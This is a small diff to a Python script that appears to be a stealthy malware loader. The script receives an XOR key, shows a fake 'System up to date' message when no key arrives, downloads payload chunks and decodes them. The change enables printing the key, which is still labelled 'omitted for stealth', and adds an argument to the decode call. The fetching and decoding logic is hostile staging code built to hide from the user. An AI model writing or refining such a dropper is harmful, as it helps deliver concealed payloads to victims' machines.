@@ -20,7 +20,7 @@ def main():
         print("[-] System up to date. (No key found)") # Stealthy exit
         return
 
-    # print(f"[+] Key received: {xor_key}") # OMITTED FOR STEALTH
+    print(f"[+] Key received: {xor_key}") # OMITTED FOR STEALTH
 
     # 2. Download Chunks
     chunks = []
@@ -40,7 +40,7 @@ def main():
     
     # 4. Decode
     try:
-        payload_bytes = Decoder.decode_pipeline(full_encrypted, xor_key)
+        payload_bytes = Decoder.decode_pipeline(full_encrypted, xor_key, None)
     except Exception:
         return
     
